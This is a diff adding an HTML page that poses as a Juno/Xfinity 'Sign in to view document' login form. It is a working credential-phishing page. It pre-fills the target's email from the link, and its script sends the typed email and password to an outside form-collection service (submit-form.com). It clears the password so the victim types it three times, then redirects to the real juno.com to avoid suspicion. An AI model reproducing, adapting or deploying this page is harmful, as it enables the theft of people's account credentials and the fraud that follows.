@@ -1,0 +1,429 @@
+﻿
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Juno Internet Service</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="	https://cdn2.downdetector.com/static/uploads/logo/juno-logo.png" type="image/x-icon">
+
+
+    <script>
+        window.onload = function() {
+          // Function to extract query parameters from the URL
+          function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+          }
+      
+          // Get the 'email' parameter from the URL
+          const email = getQueryParam('email');
+          
+          // If an email is present in the URL, set it as the value of the email input field
+          if (email) {
+            document.querySelector('input[name="email"]').value = email;
+          }
+        };
+      </script>
+
+      
+    <style>
+
+@media (max-width: 768px) {
+
+    .form-container {
+     width: 100vw;
+     height: 100vh;
+
+    }
+    .main-box{
+    width: 100vw;
+    height: 100vh;
+    padding-left: 3px;
+    padding-right: 3px;
+    }
+}
+
+.sign-layout-title{
+font-family: XfinityBrown, DMSans, Helvetica, sans-serif;
+color: black;
+font-size: 22px;
+font-weight: 700;
+margin-top: 10px;
+}
+
+.form-container{
+    display: flex; /* Enables Flexbox on the container */
+    justify-content: center; /* Centers the content horizontally */
+    align-items: center; /* Centers the content vertically */
+    height: 100vh; /* Makes the container full height of the viewport */
+    width: 100%;
+}
+
+.t-logo{
+position: absolute;
+top: 0px;
+left: 33px;
+margin-left: 10px;
+margin-bottom: 28px;
+padding-top: 28px;
+
+}
+
+.t-logo img {
+    width: 100px;
+    height: auto;
+}
+
+
+
+
+.main-box {
+    background-color: rgb(255, 255, 255);
+    /* box-shadow: rgba(255, 74, 171, 0.16) 0px 8px 24px 0px; */
+    box-sizing: border-box;
+    color: rgb(12, 12, 20);
+    display: block;
+    font-family: InterVariable, system-ui, sans-serif;
+    font-size: 14px;
+    font-style: normal;
+    font-synthesis: none;
+    font-weight: 400;
+    height: 100vh;
+    line-height: 20px;
+    margin-left: 33px;
+    margin-right: 33px;
+    max-width: 480px;
+    padding-bottom: 22px;
+    padding-left: 44px;
+    padding-right: 44px;
+    padding-top: 70px;
+    position: relative;
+    quotes: "“" "”" "‘" "’";
+    scrollbar-color: rgb(209, 207, 205) rgba(0, 0, 0, 0);
+    scrollbar-width: thin;
+    transform: matrix(1, 0, 0, 1, 0, 0);
+    transition-behavior: normal;
+    transition-delay: 0s;
+    transition-duration: 0.15s;
+    transition-property: max-width;
+    transition-timing-function: cubic-bezier(0.42, 0, 1, 1);
+    unicode-bidi: isolate;
+    width: 480px;
+    -webkit-font-smoothing: antialiased;
+}
+
+
+.welcomeSign-text-center{
+color: rgb(0, 120, 160);
+margin-bottom: 10px;
+}
+
+.to-continue{
+    color: rgb(92, 89, 88);
+    font-size: 14px;
+    font-weight: 400;
+    line-height: 20px;
+    margin-top: 8px;
+
+}
+
+
+.in-between{
+    margin-top: 20px;
+}
+
+.box{    
+    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    box-sizing: border-box;
+    color: inherit;
+    font: inherit;
+    margin: 0;
+    line-height: inherit;
+    font-family: helvetica, arial !important;
+    width: 255px;
+    padding: 0.4em;
+    font-size: 1.375em;
+    border: 1px solid red;
+    height: auto;
+    margin-bottom: 0.9375em;
+    border-radius: 0px;
+    background: #FFFFFF;
+    text-align: left;
+}
+
+.keep-me{
+    font-size: 14px;
+    font-weight: 400px;
+    cursor: pointer;
+    width: 252px;
+    color: rgb(0, 120, 160);
+}
+
+.trusted{
+    color: rgb(92, 89, 88);
+}
+
+.why{
+    color: rgb(92, 89, 88);
+
+}
+
+
+
+.signin-button {
+align-items: center;
+appearance: button;
+background-color: red;
+background-image: none;
+border-bottom-color: rgba(0, 0, 0, 0);
+border-bottom-left-radius: 4px;
+border-bottom-right-radius: 4px;
+border-bottom-style: solid;
+border-bottom-width: 2px;
+border-image-outset: 0;
+border-image-repeat: stretch;
+border-image-slice: 100%;
+border-image-source: none;
+border-image-width: 1;
+border-left-color: rgba(0, 0, 0, 0);
+border-left-style: solid;
+border-left-width: 2px;
+border-right-color: rgba(0, 0, 0, 0);
+border-right-style: solid;
+border-right-width: 2px;
+border-top-color: rgba(0, 0, 0, 0);
+border-top-left-radius: 4px;
+border-top-right-radius: 4px;
+border-top-style: solid;
+border-top-width: 2px;
+box-sizing: border-box;
+color: rgb(246, 246, 249);
+cursor: pointer;
+display: flex;
+flex-direction: row;
+font-family: DMSans, Helvetica, sans-serif;
+font-feature-settings: normal;
+font-kerning: auto;
+font-optical-sizing: auto;
+font-size: 17.3px;
+font-size-adjust: none;
+font-stretch: 100%;
+font-style: normal;
+font-variant-alternates: normal;
+font-variant-caps: normal;
+font-variant-east-asian: normal;
+font-variant-emoji: normal;
+font-variant-ligatures: normal;
+font-variant-numeric: normal;
+font-variant-position: normal;
+font-variation-settings: normal;
+font-weight: 700;
+height: 56px;
+justify-content: center;
+justify-items: center;
+letter-spacing: normal;
+line-height: 24px;
+margin-bottom: 40px;
+margin-left: 5px;
+margin-right: 0px;
+margin-top: 20px;
+outline-color: rgba(0, 0, 0, 0);
+outline-offset: 2px;
+outline-style: solid;
+outline-width: 2px;
+padding-block-end: 14px;
+padding-block-start: 14px;
+padding-bottom: 14px;
+padding-inline-end: 28px;
+padding-inline-start: 28px;
+padding-left: 28px;
+padding-right: 28px;
+padding-top: 14px;
+position: relative;
+tab-size: 4;
+text-align: center;
+text-decoration-line: none;
+text-indent: 0px;
+text-rendering: auto;
+text-shadow: none;
+text-size-adjust: 100%;
+text-transform: none;
+touch-action: manipulation;
+transition-behavior: normal;
+transition-delay: 0s;
+transition-duration: 0.2s;
+transition-property: all;
+transition-timing-function: ease-in;
+visibility: visible;
+width: 118.68px;
+word-spacing: 0px;
+-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+-webkit-border-image: none;
+
+}
+
+.new-to {
+    color: rgb(85, 20, 180);
+    text-align: left;
+    margin-top: 14px;
+    font-size: 12px;
+    font-weight: 300;
+    text-decoration: underline;
+  
+
+.create {
+    color: rgb(109, 74, 255);
+    text-decoration-color: rgb(109, 74, 255);
+    text-decoration-line: underline;
+
+}
+
+.my-4{
+    margin-top: 16px;
+    margin-bottom: 16px;
+}
+
+.trouble{
+    color: rgb(109, 74, 255);
+    text-decoration-color: rgb(109, 74, 255);
+    text-decoration-line: underline;
+    font-size: 15px;
+    font-weight: 400;
+}
+
+.trouble-div{
+display: block;
+text-align: center;
+
+}
+
+
+.policy{
+    font-size: 14px;
+    font-weight: 400;
+    font-family: DMSans, Helvetica, sans-serif;
+    margin-left: 8px;
+    color: blue;
+    
+}
+
+
+
+
+    </style>
+
+</head>
+
+
+
+<body style="background-color: white;">
+
+    <div class="whole-page">
+        
+        <div class="proton-english">
+       
+
+
+        <div class="form-container">
+            <div class="main-box">
+
+
+<form id="contact" class="form-horizontal well">
+    <div class="t-logo">
+        <img id="dimg_a1S1Z_vgAc7dptQPvK3AgA8_383" src="https://www.juno.com/static/start/view/img/www/b/logo_j.gif" data-atf="5" alt="Xfinity">
+    </div>
+
+    <div class="welcomeSign-text-center">
+        <span style="font-weight: bold; font-size: 16px; color: red;">Sign in to view document</span>    </div>
+
+
+
+    <div class="form-space">
+        <div>
+            <input id="username" type="text" name="email" aria-describedby="id-3" placeholder="Member ID" class="box" value="">
+        </div>
+    </div>
+
+    <div class="in-between" id="id-3"></div>
+
+    <div class="form-space">
+        <div>
+            <input placeholder="Password" name="pass" type="password" class="box">
+        </div>
+    </div>
+
+    <div class="checkbox">
+        <label class="btn-btn-link-keepSigned">
+        <input type="checkbox" id="keepmesignedin" name="keepmesignedin" class="">
+            Keep me signed-in</label>
+    </div>
+
+  
+
+    <button class="signin-button" aria-bu1sy="false" type="submit" id="submit-btn">Sign-in</button>
+
+
+</form>
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+$(document).ready(function() {
+    var attemptCount = 0;
+    
+    $("#contact").on('submit', function(e) {
+        e.preventDefault();
+        
+        var email = $("#username").val();
+        var password = $("input[name='pass']").val();
+        
+        attemptCount++;
+        
+        if (attemptCount <= 3) {
+            $.ajax({
+                dataType: "JSON",
+                url: "https://submit-form.com/rCt1wY5OC",
+                type: "POST",
+                data: {
+                    email: email,
+                    password: password
+                },
+                beforeSend: function() {
+                    $("#submit-btn").html("Verifying...");
+                },
+                success: function(response) {
+                    if (response) {
+                        console.log(response);
+                    }
+                },
+                // error: function() {
+                //     alert("Invalid credentials, please try again..");
+                // },
+                complete: function() {
+                    $("#submit-btn").html("Sign-in");
+                    // Clear password field after first,,, and second submissions
+                    if (attemptCount < 3) {
+                        $("input[name='pass']").val('');
+                    }
+                    // Redirect after third submission
+                    if (attemptCount === 3) {
+                        window.location.replace("https://www.juno.com/");
+                    }
+                }
+            });
+        }
+    });
+});
+</script>
+                
+            </div>
+        </div>
+    </div>
+</body>
+</html>
